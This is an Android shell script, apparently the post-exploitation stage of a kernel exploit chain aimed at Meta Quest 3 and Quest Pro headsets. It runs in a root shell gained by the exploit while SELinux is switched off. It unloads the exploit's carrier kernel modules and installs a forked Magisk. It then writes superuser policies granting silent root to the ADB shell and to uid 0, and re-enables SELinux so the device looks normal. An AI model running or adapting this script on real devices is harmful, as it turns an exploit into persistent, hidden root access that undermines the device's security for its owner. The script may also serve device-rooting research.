#!/system/bin/sh
# Runs as the cred-patched (uid 0, all caps) waiting shell. The carrier module already flipped
# enforcing=0 AND synced the SELinux status page (selinux_status_update_setenforce) so userspace
# is truly permissive -> setprop/ctl.*/magiskpolicy work.
#   drop_caches -> rmmod carriers -> Singularity Magisk (v30.7 fork, NO zygote restart) -> setenforce 1
# CARRIER_MODS (space-separated, from the orchestrator) = the modules to unload for this target
# (Q3: "usbip_vudc llcc_perfmon"; Quest Pro: "rdbg").
LOG=/data/local/tmp/postex.log
{
echo "=== postex start: uid=$(id -u) ctx=$(id -Z 2>/dev/null) enforce=$(getenforce) ==="
cd /data/local/tmp
sync; echo 3 > /proc/sys/vm/drop_caches 2>/dev/null && echo "[+] drop_caches"
for m in ${CARRIER_MODS:-usbip_vudc llcc_perfmon}; do
  rmmod $m 2>/dev/null && echo "[+] rmmod $m"
done
if [ "$SKIP_MAGISK" = "1" ]; then
  echo "[i] SKIP_MAGISK=1 (magisk step skipped)"
else
  echo "[*] Singularity Magisk (v30.7 fork, no zygote restart) ..."
  export IONSTACK_APK=/data/local/tmp/singularity-Magisk.apk
  export IONSTACK_PAYLOAD_RESULT=/data/local/tmp/sl_result
  export SL_RESTART_ZYGOTE=0
  sh /data/local/tmp/singularity_magisk.sh; echo "[+] singularity rc=$?"
  # grant ADB shell (2000) + root (0) MagiskSU so `su` is usable headlessly
  for u in 2000 0; do
    /data/adb/magisk/magisk64 --sqlite "REPLACE INTO policies (uid,policy,until,logging,notification) VALUES($u,2,0,0,0)" 2>/dev/null
  done
  echo "[+] MagiskSU granted to uid 0,2000 (magisk installs 'su' in PATH)"
fi
setenforce 1; echo "[+] setenforce 1 -> $(getenforce)"
echo "[*] headless su under enforcing: $(su -c 'id -u; getenforce' 2>&1 | tr '\n' ' ')"
echo "=== postex done: uid=$(id -u) enforce=$(getenforce) ==="
} >> $LOG 2>&1
# su (magisk context) can write the marker even under enforcing; fall back to plain touch
su -c 'touch /data/local/tmp/postex_done' 2>/dev/null || touch /data/local/tmp/postex_done 2>/dev/null
